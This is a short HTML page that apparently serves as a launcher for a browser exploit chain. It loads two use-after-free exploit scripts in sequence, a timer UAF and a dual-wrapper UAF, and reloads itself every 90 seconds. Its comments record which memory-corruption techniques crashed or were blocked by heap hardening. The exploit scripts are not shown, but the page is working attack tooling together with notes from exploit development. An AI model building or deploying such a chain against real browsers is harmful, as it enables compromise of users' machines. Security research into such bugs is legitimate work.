<!DOCTYPE html>
<html><head>
<meta charset="utf-8">
<title>V510-V509 Chain</title>
<meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
</head><body>
<script>
// V510 (timer UAF) FIRST — it uses iframes, won't crash the page
// V509 (dual-wrapper) SECOND — may crash via save() on freed memory
// V507 REMOVED — confirmed: Path2D carrier DEAD (save() crash = IsoHeap wall)
var scripts = ['p510-timer-uaf.js', 'p509-dual-wrapper-uaf.js'];
var idx = 0;
function loadNext() {
  if (idx < scripts.length) {
    var s = document.createElement('script');
    s.src = scripts[idx++];
    s.onload = function() { setTimeout(loadNext, 2000); };
    s.onerror = function() { setTimeout(loadNext, 500); };
    document.body.appendChild(s);
  }
}
loadNext();
setTimeout(function() { location.reload(); }, 90000);
</script>
</body></html>
